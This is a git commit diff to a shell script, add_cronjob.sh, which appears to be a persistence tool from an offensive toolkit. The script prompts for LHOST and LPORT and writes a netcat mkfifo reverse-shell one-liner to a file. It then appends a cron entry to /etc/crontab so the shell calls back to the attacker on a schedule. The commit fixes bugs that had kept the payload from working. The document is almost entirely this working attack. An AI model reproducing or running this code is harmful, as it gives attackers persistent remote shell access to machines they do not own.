7dda3f221be3122748e126128e926d1016d5e9be
manitorpotterk <45949793+manitorpotterk@users.noreply.github.com>
2020-10-24 00:27:58 +0530

    Update add_cronjob.sh

--- scripts/add_cronjob.sh
+++ scripts/add_cronjob.sh
@@ -10,24 +10,27 @@ echo '2. For adding custom Command in cronjob'
                                                                                                                    
 read option                                                                                                        
                                                                                                                    
-echo '#!/bin/bash' > $PWD/script                                                                                   
+echo '#!/bin/bash' > $PWD/script_cron                                                                                
                                                                                                                    
 if [[ $option == 1 ]]                                                                                              
 then                                                                                                               
         echo 'Enter LHOST'                                                                                         
-        read $IP                                                                                                   
+        read IP                                                                                                   
         echo 'Enter LPORT'                                                                                         
-        read $PORT
-        myvar=$( rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f )
-        echo $myvar > $PWD/script
+        read PORT
+        myvar="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"
+        echo $myvar >> $PWD/script_cron
 elif [[ $option == 2 ]]
 then
         echo 'Enter the custom command'
         read comm
-        echo $comm >> $PWD/script
+        echo $comm >> $PWD/script_cron
 else
         echo 'You Have entered the wrong option mate start again'
 fi
 
-chmod +x $PWD/script
-echo '5 * * * * $USER $PWD/script' >> /etc/crontab
+chmod +x $PWD/script_cron
+echo '5 * * * * $USER $PWD/script_cron' >> /etc/crontab
+
+echo 'command added man'
+echo '------------------------------------------------------------------------------'
